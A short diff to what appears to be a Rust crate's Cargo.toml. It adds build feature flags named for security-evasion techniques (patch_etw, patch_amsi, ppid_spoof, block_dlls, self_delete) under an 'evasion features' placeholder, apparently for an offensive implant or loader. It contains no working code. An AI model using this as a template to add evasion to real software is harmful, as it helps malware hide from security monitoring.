@@ -10,6 +10,11 @@ crate-type = ["cdylib"]
 service = []
 iat_hiding = []
 debug = []
+patch_etw = []
+patch_amsi = []
+ppid_spoof = []
+block_dlls = []
+self_delete = []
 # __EVASION_FEATURES__
 
 [profile.release]
